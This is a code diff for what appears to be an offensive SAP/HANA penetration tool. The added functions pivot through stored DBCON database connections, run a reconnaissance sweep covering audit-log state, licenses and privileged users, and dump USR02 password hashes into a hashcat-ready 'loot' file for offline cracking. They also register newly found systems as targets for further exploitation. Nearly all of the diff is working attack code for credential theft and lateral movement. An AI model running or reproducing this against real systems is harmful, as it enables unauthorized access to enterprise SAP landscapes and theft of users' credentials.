@@ -475,7 +475,8 @@ def _hana_error_code(exc):
     return None
 
 
-def probe_dbcon_edge(edge: DBCONConnection) -> None:
+def probe_dbcon_edge(edge: DBCONConnection,
+                       state: SAPMAPState = None) -> None:
     """Open a driver-level connection to the DBCON target, mark it
     tested + reachable, and fingerprint what's on the other side
     (SAP-shape via USR02, target_sid via T000).  Mutates the edge
@@ -570,6 +571,13 @@ def probe_dbcon_edge(edge: DBCONConnection) -> None:
                   + (f" (target SID {edge.target_sid})"
                      if edge.target_sid else "")
                   + " — direct SAPMAP00 create possible")
+            # Materialise the target as a real SAP node so the map
+            # shows it and normal scan/exploit flow can reach it.
+            if state is not None and edge.target_sid:
+                try:
+                    materialize_target_as_sap_node(edge, state)
+                except Exception as _mat_ex:
+                    print(f"[-] materialize skipped: {_mat_ex}")
         else:
             _hint = {
                 "usr02_missing": "definitive non-SAP HANA (USR02 does "
@@ -913,3 +921,422 @@ def peek_hana_table(edge: DBCONConnection, schema: str, table: str,
             if conn is not None: conn.close()
         except Exception: pass
     return out
+
+
+# ============================================================================
+# Column browser — describe a table before peeking it
+# ============================================================================
+
+def describe_hana_table(edge: DBCONConnection, schema: str,
+                          table: str) -> dict:
+    """Return column metadata for `schema.table` via SYS.TABLE_COLUMNS.
+
+    Enables the operator to see WHICH columns are in a table before
+    pulling rows.  Returns {ok, error, columns: [{name, type, len,
+    nullable, position}]}.
+    """
+    out = {"ok": False, "error": "", "columns": []}
+    if not _HANA_IDENT_RE.match(schema or ""):
+        out["error"] = f"invalid schema identifier: {schema!r}"
+        return out
+    if not _HANA_IDENT_RE.match(table or ""):
+        out["error"] = f"invalid table identifier: {table!r}"
+        return out
+    if edge.dbms != "HDB":
+        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
+        return out
+    if not edge.reachable:
+        out["error"] = "edge not reachable"
+        return out
+
+    dbapi, err = _import_hdbcli()
+    if dbapi is None:
+        out["error"] = err
+        return out
+
+    kwargs = {
+        "address": edge.host, "port": edge.port,
+        "user": edge.user, "password": edge.password,
+        "autocommit": True, "communicationTimeout": 20000,
+    }
+    if edge.dbname: kwargs["databaseName"] = edge.dbname
+
+    conn = None
+    try:
+        conn = dbapi.connect(**kwargs)
+        cur = conn.cursor()
+        try:
+            cur.execute(
+                "SELECT COLUMN_NAME, DATA_TYPE_NAME, LENGTH, "
+                "IS_NULLABLE, POSITION "
+                "FROM SYS.TABLE_COLUMNS "
+                "WHERE SCHEMA_NAME=? AND TABLE_NAME=? "
+                "ORDER BY POSITION", (schema, table))
+            for r in cur.fetchall():
+                out["columns"].append({
+                    "name":     str(r[0] or ""),
+                    "type":     str(r[1] or ""),
+                    "len":      int(r[2] or 0),
+                    "nullable": (str(r[3]) == "TRUE"),
+                    "position": int(r[4] or 0),
+                })
+            out["ok"] = True
+        finally:
+            cur.close()
+        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"describe {schema}.{table}: "
+              f"{len(out['columns'])} columns")
+    except Exception as e:
+        code = _hana_error_code(e)
+        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
+        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"describe {schema}.{table} failed: {out['error']}")
+    finally:
+        try:
+            if conn is not None: conn.close()
+        except Exception: pass
+    return out
+
+
+# ============================================================================
+# HANA reconnaissance sweep — one-click landscape facts
+# ============================================================================
+
+_RECON_QUERIES = [
+    ("host_info",
+     "SELECT HOST, VALUE FROM M_HOST_INFORMATION "
+     "WHERE KEY IN ('build_version', 'build_date', 'sid') LIMIT 20",
+     "hostname + build"),
+    ("database",
+     "SELECT DATABASE_NAME, ACTIVE_STATUS, IS_DATABASE_LOCAL "
+     "FROM M_DATABASE",
+     "tenant / MDC info"),
+    ("license",
+     "SELECT SYSTEM_ID, HARDWARE_KEY, INSTALL_NO, PRODUCT_NAME, "
+     "PRODUCT_LIMIT, VALID_FROM, EXPIRATION_DATE, IS_PERMANENT "
+     "FROM M_LICENSE",
+     "license + HWKEY"),
+    ("services",
+     "SELECT SERVICE_NAME, PORT, PROCESS_ID, ACTIVE_STATUS "
+     "FROM M_SERVICES WHERE ACTIVE_STATUS='YES' LIMIT 20",
+     "running HANA services"),
+    ("clients",
+     "SELECT DISTINCT MANDT FROM T000 ORDER BY MANDT",
+     "SAP client list (if ABAP-shape)"),
+    ("audit",
+     "SELECT VALUE FROM M_INIFILE_CONTENTS "
+     "WHERE FILE_NAME='global.ini' AND SECTION='auditing configuration' "
+     "AND KEY='global_auditing_state' LIMIT 1",
+     "audit-log state"),
+    ("privileged_users",
+     "SELECT USER_NAME, CREATOR, USER_MODE "
+     "FROM SYS.USERS WHERE USER_MODE='LOCAL' "
+     "AND USER_NAME IN ('SYSTEM', 'SYS', '_SYS_REPO', 'SAPHANADB', "
+     "'SAPABAP1', 'SAPSR3') LIMIT 20",
+     "known-privileged users present"),
+]
+
+
+def hana_recon_sweep(edge: DBCONConnection) -> dict:
+    """Run a battery of HANA reconnaissance queries in one connection
+    and populate edge.recon_facts.  Errors on individual queries are
+    non-fatal — the fact is stored as {"error": "..."} so the panel
+    surfaces WHICH facts were denied."""
+    out = {"ok": False, "error": "", "facts": {}}
+    if edge.dbms != "HDB":
+        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
+        return out
+    if not edge.reachable:
+        out["error"] = "edge not reachable — Test Connection first"
+        return out
+
+    dbapi, err = _import_hdbcli()
+    if dbapi is None:
+        out["error"] = err
+        return out
+
+    kwargs = {
+        "address": edge.host, "port": edge.port,
+        "user": edge.user, "password": edge.password,
+        "autocommit": True, "communicationTimeout": 60000,
+    }
+    if edge.dbname: kwargs["databaseName"] = edge.dbname
+
+    print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
+          f"HANA recon sweep ({len(_RECON_QUERIES)} queries) against "
+          f"{edge.host}:{edge.port}")
+    conn = None
+    try:
+        conn = dbapi.connect(**kwargs)
+        for key, sql, note in _RECON_QUERIES:
+            cur = conn.cursor()
+            try:
+                cur.execute(sql)
+                rows = cur.fetchall()
+                out["facts"][key] = {
+                    "columns": [d[0] for d in (cur.description or [])],
+                    "rows": [[(str(v) if v is not None else None)
+                              for v in r] for r in rows],
+                    "count": len(rows),
+                }
+                print(f"    [+] recon.{key}: {len(rows)} row(s) — {note}")
+            except Exception as e:
+                code = _hana_error_code(e)
+                out["facts"][key] = {
+                    "error": f"HANA {code or '?'}: {str(e)[:120]}",
+                    "note":  note,
+                }
+                print(f"    [-] recon.{key}: {out['facts'][key]['error']}")
+            finally:
+                cur.close()
+        out["ok"] = True
+        edge.recon_facts = dict(out["facts"])
+    except Exception as e:
+        code = _hana_error_code(e)
+        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
+        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"recon sweep aborted: {out['error']}")
+    finally:
+        try:
+            if conn is not None: conn.close()
+        except Exception: pass
+    return out
+
+
+# ============================================================================
+# USR02 hash dump — one-click extraction to loot/ for offline cracking
+# ============================================================================
+
+_SAP_SCHEMA_CANDIDATES = [
+    "SAPHANADB", "SAPABAP1", "SAPSR3", "SAP", "SAPQ01", "SAPP01",
+    "SAPD01",
+]
+
+
+def _resolve_sap_schema(conn, target_sid: str = "") -> str:
+    """Find which schema on this HANA holds USR02.
+
+    Tries release-specific candidates first (SAP<SID>DB / SAP<SID>),
+    then generic release-vanilla names, then a SYS.TABLES scan.
+    Returns the schema name or "" if not found.
+    """
+    candidates = list(_SAP_SCHEMA_CANDIDATES)
+    if target_sid:
+        candidates.insert(0, f"SAP{target_sid.upper()}")
+        candidates.insert(0, f"SAP{target_sid.upper()}DB")
+    for schema in candidates:
+        cur = conn.cursor()
+        try:
+            cur.execute(
+                "SELECT COUNT(*) FROM SYS.TABLES "
+                "WHERE SCHEMA_NAME=? AND TABLE_NAME='USR02'",
+                (schema,))
+            r = cur.fetchone()
+            if r and int(r[0]) > 0:
+                return schema
+        except Exception:
+            pass
+        finally:
+            cur.close()
+    cur = conn.cursor()
+    try:
+        cur.execute(
+            "SELECT SCHEMA_NAME FROM SYS.TABLES "
+            "WHERE TABLE_NAME='USR02' "
+            "AND SCHEMA_NAME NOT LIKE '\\_SYS\\_%' ESCAPE '\\' "
+            "LIMIT 1")
+        r = cur.fetchone()
+        return str(r[0]).strip() if r and r[0] else ""
+    finally:
+        cur.close()
+
+
+def dump_usr02_hashes(edge: DBCONConnection,
+                        source_node: SAPNode = None,
+                        loot_dir: str = "") -> dict:
+    """Extract USR02 password hashes (BCODE + PASSCODE + PWDSALTEDHASH)
+    via direct SQL and write a hashcat-formatted file to loot/.
+
+    Returns {ok, error, count, hash_types, loot_path}.  Hash file
+    format (one row per line):
+        BNAME:MANDT:BCODE_HEX:PASSCODE_HEX:PWDSALTEDHASH
+    Empty hashes are omitted.  Hashcat modes: BCODE=7900,
+    PASSCODE=10300 (with SAP prefix hint), PWDSALTEDHASH is iSSHA
+    or PBKDF2-SHA1 depending on kernel.
+    """
+    import os as _os
+    from datetime import datetime as _dt
+    out = {"ok": False, "error": "", "count": 0, "loot_path": "",
+           "hash_types": {"bcode": 0, "passcode": 0, "pwdsaltedhash": 0}}
+    if edge.dbms != "HDB":
+        out["error"] = f"v1 supports HDB only (dbms={edge.dbms})"
+        return out
+    if not (edge.reachable and edge.is_sap_shape):
+        out["error"] = ("edge must be SAP-shape reachable — "
+                         "USR02 dump needs USR02 present")
+        return out
+
+    dbapi, err = _import_hdbcli()
+    if dbapi is None:
+        out["error"] = err
+        return out
+
+    kwargs = {
+        "address": edge.host, "port": edge.port,
+        "user": edge.user, "password": edge.password,
+        "autocommit": True, "communicationTimeout": 60000,
+    }
+    if edge.dbname: kwargs["databaseName"] = edge.dbname
+
+    conn = None
+    try:
+        conn = dbapi.connect(**kwargs)
+        schema = _resolve_sap_schema(conn, target_sid=edge.target_sid)
+        if not schema:
+            out["error"] = ("could not locate USR02 in any known SAP "
+                             "schema — tried "
+                             f"{_SAP_SCHEMA_CANDIDATES}")
+            return out
+        print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"dumping USR02 from {schema}.USR02 on {edge.host}")
+
+        cur = conn.cursor()
+        rows_extracted = []
+        try:
+            cur.execute(
+                f'SELECT MANDT, BNAME, BCODE, PASSCODE, PWDSALTEDHASH '
+                f'FROM "{schema}"."USR02" '
+                f'ORDER BY BNAME')
+            for r in cur.fetchall():
+                mandt = str(r[0] or "").strip()
+                bname = str(r[1] or "").strip()
+                if not bname:
+                    continue
+                def _hex(v):
+                    if v is None: return ""
+                    if isinstance(v, (bytes, bytearray)):
+                        return v.hex().upper()
+                    return str(v).strip()
+                bcode  = _hex(r[2])
+                pcode  = _hex(r[3])
+                psalt  = str(r[4] or "").strip()
+                if bcode:  out["hash_types"]["bcode"] += 1
+                if pcode:  out["hash_types"]["passcode"] += 1
+                if psalt:  out["hash_types"]["pwdsaltedhash"] += 1
+                rows_extracted.append(
+                    f"{bname}:{mandt}:{bcode}:{pcode}:{psalt}")
+        finally:
+            cur.close()
+
+        out["count"] = len(rows_extracted)
+        if out["count"] == 0:
+            out["error"] = "USR02 SELECT returned 0 rows"
+            return out
+
+        if not loot_dir:
+            loot_dir = _os.path.join(_os.getcwd(), "loot", "dbcon")
+        _os.makedirs(loot_dir, exist_ok=True)
+        ts = _dt.utcnow().strftime("%Y%m%d_%H%M%S")
+        sid = (edge.target_sid or edge.con_name).upper()
+        path = _os.path.join(
+            loot_dir, f"usr02_{sid}_{edge.con_name}_{ts}.txt")
+        header = (
+            f"# SAPMAP DBCON USR02 hash dump\n"
+            f"# Source SAP: {edge.source_sid}\n"
+            f"# DBCON:      {edge.con_name}\n"
+            f"# Target:     {edge.host}:{edge.port} "
+            f"(SID={edge.target_sid or '?'}, schema={schema})\n"
+            f"# Dumped:     {_dt.utcnow().isoformat()}Z\n"
+            f"# Format:     BNAME:MANDT:BCODE_HEX:PASSCODE_HEX:PWDSALTEDHASH\n"
+            f"# Rows:       {out['count']}\n"
+            f"# BCODE:      {out['hash_types']['bcode']} (hashcat -m 7900)\n"
+            f"# PASSCODE:   {out['hash_types']['passcode']} (hashcat -m 10300 with SAP prefix)\n"
+            f"# PWDSALTED:  {out['hash_types']['pwdsaltedhash']} (iSSHA / PBKDF2-SHA1)\n"
+            f"#\n")
+        with open(path, "w") as fh:
+            fh.write(header)
+            fh.write("\n".join(rows_extracted) + "\n")
+        try:
+            _os.chmod(path, 0o600)
+        except Exception:
+            pass
+        edge.usr02_hashes_loot_path = path
+        out["loot_path"] = path
+        out["ok"] = True
+        print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"USR02 dump: {out['count']} row(s), "
+              f"BCODE={out['hash_types']['bcode']}, "
+              f"PASSCODE={out['hash_types']['passcode']}, "
+              f"PWDSALTEDHASH={out['hash_types']['pwdsaltedhash']} — "
+              f"loot: {path}")
+    except Exception as e:
+        code = _hana_error_code(e)
+        out["error"] = f"HANA {code or '?'}: {str(e)[:200]}"
+        print(f"[-] {edge.source_sid}: DBCON {edge.con_name} — "
+              f"USR02 dump failed: {out['error']}")
+    finally:
+        try:
+            if conn is not None: conn.close()
+        except Exception: pass
+    return out
+
+
+# ============================================================================
+# Materialize DBCON target as a first-class SAP node on the map
+# ============================================================================
+
+def materialize_target_as_sap_node(edge: DBCONConnection,
+                                     state: SAPMAPState):
+    """When the DBCON probe confirms is_sap_shape AND we have a
+    target_sid, promote the target from "cylinder on the map" to a
+    first-class SAPNode so the normal scan / exploit flow can reach it.
+
+    Idempotent: if a node with the same SID already exists, tag it
+    with discovered_via_dbcon (unless already set) and return.
+    Otherwise create a new node via state.add_node().  Returns the
+    node or None on skip.
+    """
+    if not (edge.is_sap_shape and edge.target_sid and edge.reachable):
+        return None
+    target_sid = edge.target_sid.upper().strip()
+    if not target_sid:
+        return None
+    existing = state.get_node(target_sid)
+    if existing is not None:
+        if not existing.discovered_via_dbcon:
+            existing.discovered_via_dbcon = True
+            existing.dbcon_parent_sid = edge.source_sid
+            existing.dbcon_parent_con_name = edge.con_name
+            print(f"[*] materialize_target_as_sap_node: {target_sid} "
+                  f"already on map — tagged as discovered_via_dbcon "
+                  f"(parent {edge.source_sid}/{edge.con_name})")
+        return existing
+    node = SAPNode(
+        sid=target_sid,
+        ip=edge.host,
+        hostname=edge.host,
+        discovered_via_dbcon=True,
+        dbcon_parent_sid=edge.source_sid,
+        dbcon_parent_con_name=edge.con_name,
+    )
+    try:
+        state.add_node(node)
+        print(f"[+] materialize_target_as_sap_node: new SAPNode "
+              f"{target_sid} @ {edge.host} added (via DBCON pivot "
+              f"from {edge.source_sid}/{edge.con_name})")
+        try:
+            from sapmap_findings import emit_finding
+            emit_finding(
+                "HIGH", edge.source_sid,
+                f"DBCON pivot uncovered a new SAP system: "
+                f"{target_sid} @ {edge.host}:{edge.port} "
+                f"(via /DBCON/{edge.con_name})",
+                ref="dbcon.new_sap_system",
+                attack_capability="lateral.dbcon_direct")
+        except Exception:
+            pass
+    except Exception as e:
+        print(f"[-] materialize_target_as_sap_node: state.add_node "
+              f"failed for {target_sid}: {type(e).__name__}: {e}")
+        return None
+    return node
